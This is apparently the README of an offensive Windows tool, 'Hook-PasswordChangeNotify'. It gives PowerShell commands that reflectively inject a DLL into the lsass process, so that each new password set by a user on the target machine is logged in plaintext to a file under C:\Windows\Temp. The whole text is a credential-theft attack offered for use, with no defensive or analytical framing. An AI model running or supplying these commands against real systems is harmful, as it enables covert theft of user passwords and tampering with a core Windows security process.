# Hook-PasswordChangeNotify
1、Execute flowing command in powershell:

~~~
Import-Module .\Invoke-ReflectivePEInjection.ps1
Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass
~~~

2、when user of target machine modify password，the new passowrd will wirte to C:\Windows\Temp\passwords.txt
